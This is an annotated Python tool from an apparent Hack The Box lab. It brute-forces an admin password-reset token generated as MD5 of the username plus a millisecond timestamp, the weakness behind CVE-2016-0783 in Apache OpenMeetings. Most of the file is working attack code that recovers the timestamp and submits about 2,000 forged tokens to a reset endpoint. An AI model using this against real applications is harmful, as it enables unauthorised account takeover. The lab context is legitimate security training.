#This Library was built for a very specific problem. I built this to aid me in guessing the admin token generated by a Web App running on Apache
#   That was using the same logic as the vulnerability reported as CVE-2016-0783 on Apache OpenMeeting.
#   https://www.cvedetails.com/cve/CVE-2016-0783/
#   We were given the following information up front and asked to find the admin user's token:
#       Create a token on the web application exposed at subdirectory /question1/ using the *Create a reset token for htbuser* button. Within 
#       an interval of +-1 second a token for the htbadmin user will also be created. The algorithm used to generate both tokens is the same 
#       as the one shown when talking about the Apache OpenMeeting bug. Forge a valid token for htbadmin and login by pressing the "Check" button. 
#       What is the flag?
#   and the "algorithm" given was:
#      <?php
#      function generate_reset_token($username) {
#        $time = intval(microtime(true) * 1000);
#        $token = md5($username . $time);
#        return $token;
#      }



import time
from datetime import datetime
from hashlib import md5
import requests


#Call this in a Python script like "tokenLib.epoch('2023-12-25 03:02:45pm')"
    #NOTE That this takes a date in the format "YYYY-MM-DD HH:MM:SS(am/pm)" like the one above
def epoch(date):
    
    #Parse the individual time objects out of the date string
    timeList = [date[0:4], date[5:7], date[8:10], date[11:13], date[14:16], date[17:19]]
    
    #Convert to 24 hour time adding 12 to the hour if we're in PM
    if date[-2:] == "pm":
        timeList[3] = str(int(timeList[3]) + 12)
    
    #convert the list to a string
    joined = "".join(timeList)

    #datetime.strptime() works on a string and returns a list of the objects
    #.timetuple() converts a list to a "timetuple" object to be used by the time.mktime() module
    #I multiplied my epoch time by 1000 to get the epoch time in milliseconds
    #Change "14400000" to a different value to subtract for your timezone to get this to GMT
    epoch = int(time.mktime(datetime.strptime(joined, "%Y%m%d%H%M%S").timetuple()) * 1000) - 14400000 

    return epoch


#Call this in a Python script like "tokenLib.offset('1680095220000', '4cafb969c39e8f13ca498cfb1dbe972a')"
    #NOTE: for this specific problem I was trying to solve, the "token" is an MD5 hash of the 
    #   username+epoch time in milliseconds that the token was generated. The token was generated using
    #   the algorithm containing the vulnerability reported as CVE-2016-0783 on Apache OpenMeeting.
    #For example an MD5 hash of "htbuser1680095220000" would have been "4cafb969c39e8f13ca498cfb1dbe972a"
def offset(epochTime, token):
    hashlist = []
    
    #Since we are given a date/time that is not in milliseconds, we need to figure out the exact millisecond the token was created.
    #   This can be done by doing an offline brute force of the md5 hash using limited guesses as we know it would have been created
    #   within a 1 second (or 1000 millisecond) window in either direction of the time provided.
    for i in range(int(epochTime) - 1000, int(epochTime) + 1001):
        
        #For each given epoch time, try appending that to the "htbuser" string and then getting an MD5 hash of it to see if it matches.
        hashlist.append(md5(("htbuser"+str(i)).encode()).hexdigest())
    
    #Identify the index in our hashlist containing the supplied token
    offset = hashlist.index(token)

    #We will use this offset to identify the exact epoch time this token was created.
    #We also need to subtract by 1000 before adding the offset because otherwise the offset would go too far
    #   in the case where we could have an exact epoch time that is less than the rounded epoch time.
    userEpoch = int(epochTime) - 1000 + offset
    
    print("Index: {}\nValue: {}\nEpoch Of User: {}".format(str(offset), str(token),str(userEpoch)))


#You can call this directly if you want, but for my purposes, I made another module to call it programatically
#It is used like "tokenLib.attempt('http://blah.blah/password-reset.php', '4cafb969c39e8f13ca498cfb1dbe972a')" 
#   where the first arg is the url to attempt and the second arg is a possible admin password reset token to try.
def attempt(url, token):
    
    #Had to define the following HTTP header for my app otherwise it would not work:
    reqHeaders = {"Content-Type": "application/x-www-form-urlencoded"}
    #Define Post Data below. Mine had this format
    postData = "token="+str(token)+"&submit=check"
    #Make the POST requests
    resp = requests.post(url, headers=reqHeaders, data=postData)

    #Return the content of the HTTP response as a string (.text)
    return resp.text


#This is the module where the magic happens.
#Call this in a Python script like "tokenLib.admin('http://blah.blah/password-reset.php', '1680095220252')"
#First arg is the URL to make the POST requests to and second arg is the Exact Epoch Time in Milliseconds that the other
#   user token was created. Get this second arg as the "Epoch of User" output from the tokenLib.offset() module.
def admin(url, userEpoch):

    #We are told that the admin's token is generated somewhere between 1 second before and after the user token, so we
    #   set our range limits to 1000 milliseconds before and 1001 milliseconds after when the user token was created.
    #The top of the range is 1001 more because the "range()" method in Python stops 1 short of the top of the range.
    userEpoch = int(userEpoch)
    bottom = userEpoch - 1000
    top = userEpoch + 1001

    #The below line is mainly for debugging purposes and can be commented out if you wish.
    print("Range is", (bottom), "<->", (top-1))

    #In the below codeblock, we create our list of possible tokens from the range of possible epoch times the admin
    #   token could have been created and knowing the username for the admin user is "htbadmin" thanks to information 
    #   gathered in the web app.
    adminHashList = []
    for epoch in range(bottom, top):
        
        adminHashList.append(md5(("htbadmin"+str(epoch)).encode()).hexdigest())

    #Now that we have a list, we iterate through the list and try each possible token. This is shorter than tyring to brute force
    #   every possible MD5 hash in the world which would take forever Xp vs a handful of minutes vs years.
    #We cut down the attack surface from 340,282,366,920,938,463,463,374,607,431,768,211,456 possible MD5 hashes to just over 2,000 
    #   possible MD5 hashes
    for token in adminHashList:
        response = attempt(url, token)
        print(adminHashList.index(token)+1, end="\r")
        
        #Check to see if we've got the HTML representing an incorrect token "<strong>Wrong token.</strong>"
        #   and exit printing out the full html response if we get the correct one along with the token itself.
        if (not ("<strong>Wrong token.</strong>" in response)):
            print("Found Admin's token: {}".format(token))
            print(response)
            exit()
